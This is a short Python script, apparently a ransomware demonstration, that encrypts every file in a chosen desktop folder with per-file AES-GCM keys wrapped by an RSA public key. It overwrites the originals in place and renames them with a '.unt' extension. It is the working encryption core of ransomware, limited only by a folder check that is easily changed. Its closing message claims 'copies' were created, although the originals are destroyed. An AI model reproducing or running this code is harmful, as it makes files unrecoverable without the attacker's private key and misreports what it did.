from pathlib import Path
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Hash import SHA256
from Cryptodome.Random import get_random_bytes

base = Path.home() / "Desktop" / "RansomDemo"
source = base / "critical_tk0667"
public_file = base / "keys" / "public.pem"

files = sorted(
    p for p in source.rglob("*")
    if p.is_file() and not p.name.endswith(".unt")
)

for p in files:
    if not p.resolve().is_relative_to(source.resolve()):
        raise SystemExit("File outside critical_tk0667 is not allowed: " + str(p))

rsa = PKCS1_OAEP.new(
    RSA.import_key(public_file.read_bytes()),
    hashAlgo=SHA256
)

for p in files:
    content = p.read_bytes()
    key = get_random_bytes(32)
    aes = AES.new(key, AES.MODE_GCM)
    ciphertext, tag = aes.encrypt_and_digest(content)
    encrypted_key = rsa.encrypt(key)

    payload = b"UNTDEMO2" + len(encrypted_key).to_bytes(2, "big") + encrypted_key
    payload += bytes([len(aes.nonce)]) + aes.nonce + tag + ciphertext

    p.write_bytes(payload)                       
    p.replace(p.parent / (p.name + ".unt"))
    print("Encrypted:", p.parent / (p.name + ".unt"))

print("Done:", len(files), "encrypted copies created")
